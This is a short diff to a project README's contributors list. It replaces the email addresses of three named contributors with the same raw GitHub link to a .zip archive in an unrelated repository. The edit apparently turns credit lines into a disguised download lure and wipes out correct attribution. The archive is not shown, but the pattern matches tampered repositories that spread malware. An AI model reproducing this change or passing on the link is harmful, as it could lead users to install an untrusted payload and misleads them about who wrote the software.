@@ -13,6 +13,6 @@ Credits
 
 Contributors
 ------------
-* Pedro M. Baeza <pedro.baeza@serviciosbaeza.com>
-* Ana Juaristi <anajuaristi@avanzosc.es>
-* Alfredo de la Fuente <alfredodelafuente@avanzosc.es>
+* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
+* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
+* Alfredo de la Fuente <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
